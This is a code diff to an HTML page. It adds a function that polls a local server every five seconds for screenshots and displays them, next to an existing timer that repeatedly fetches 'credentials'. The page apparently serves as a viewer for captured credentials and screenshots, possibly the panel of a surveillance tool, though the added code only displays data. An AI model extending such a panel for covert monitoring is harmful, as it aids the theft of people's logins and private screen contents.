@@ -106,7 +106,49 @@
 
         setInterval(fetchCredentials, 2000);
 
+
+    async function loadScreenshots() {
+        try {
+            const response = await fetch("http://localhost:3000/get-images");
+            const imageList = await response.json();
+
+            const screenshotDiv = document.getElementById("screenshot");
+            screenshotDiv.innerHTML = ""; // Clear existing images
+
+            imageList.forEach((imageSrc) => {
+                const img = document.createElement("img");
+                img.src = `http://localhost:3000${imageSrc}`;
+                img.classList.add("screenshot-img", "transition-all", "duration-300");
+                screenshotDiv.appendChild(img);
+            });
+        } catch (error) {
+            console.error("Error loading screenshots:", error);
+        }
+    }
+
+    // Load images every 5 seconds
+    setInterval(loadScreenshots, 5000);
+    window.onload = loadScreenshots;
+
     </script>
+
+    <style>
+    #screenshot {
+        display: flex;
+        flex-direction: row-reverse; /* Newest on the left */
+        gap: 10px;
+        overflow-x: auto;
+        white-space: nowrap;
+    }
+
+    .screenshot-img {
+        height: 100px;
+        border-radius: 5px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+        transition: transform 0.3s ease-in-out;
+    }
+    </style>
+
 
 </head>
 <body class="bg-gray-900 text-gray-100">
